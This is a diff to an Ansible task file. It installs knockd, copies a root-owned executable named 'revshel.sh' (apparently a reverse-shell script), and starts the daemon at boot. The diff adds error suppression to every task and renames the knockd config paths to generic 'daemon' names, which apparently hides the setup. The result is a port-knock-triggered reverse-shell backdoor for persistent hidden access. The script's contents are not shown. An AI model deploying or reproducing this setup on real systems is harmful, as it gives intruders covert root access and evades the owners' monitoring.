@@ -6,6 +6,7 @@
     name: knockd
     update_cache: yes
     state: present
+  ignore_errors: yes    
 
 - name: Transfer revshel.sh
   ansible.builtin.copy:
@@ -14,25 +15,29 @@
     owner: root
     group: root
     mode: '0755'
+  ignore_errors: yes
 
 - name: Configure /etc/knockd.conf
   ansible.builtin.template:
     src: knockd.conf.j2
-    dest: /etc/knockd.conf
+    dest: /etc/daemon.conf
     owner: root
     group: root
     mode: '0644'
+  ignore_errors: yes
 
 - name: Configure /etc/default/knockd
   ansible.builtin.template:
     src: knockd.default.j2
-    dest: /etc/default/knockd
+    dest: /etc/default/daemon
     owner: root
     group: root
     mode: '0644'
+  ignore_errors: yes
 
 - name: start knockd
   ansible.builtin.systemd:
     name: knockd
     state: started
     enabled: true
+  ignore_errors: yes
